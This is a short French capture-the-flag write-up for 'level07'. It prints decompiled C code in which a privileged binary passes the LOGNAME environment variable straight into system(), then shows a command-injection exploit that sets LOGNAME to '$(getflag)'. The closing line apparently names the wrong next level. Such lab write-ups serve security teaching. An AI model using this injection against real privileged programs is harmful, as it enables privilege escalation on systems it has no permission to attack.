# Level07

[ENGLISH version](README_EN.md)

## Comment récuperer le flag

En décompilant level07, voici son code source:

```
void main(void)
{
    undefined4 uVar1;
    undefined4 uStack28;
    undefined4 uStack24;
    undefined4 uStack20;
    
    uStack24 = getegid();
    uStack20 = geteuid();
    setresgid(uStack24, uStack24, uStack24);
    setresuid(uStack20, uStack20, uStack20);
    uStack28 = 0;
    uVar1 = getenv("LOGNAME");
    asprintf(&uStack28, "/bin/echo %s ", uVar1);
    system(uStack28);
    return;
}
```

On peut voir que le programme récupère le contenu de la variable d'environnement LOGNAME, puis l'affiche.

On ne peut pas ici utiliser de lien symbolique car echo est appelé directement avec son path absolu.

Il suffit alors juste d'utiliser un sous shell

```
export LOGNAME='$(getflag)'
./level07
```

## Le flag

Le flag lu est celui utilisable pour se connecter a level06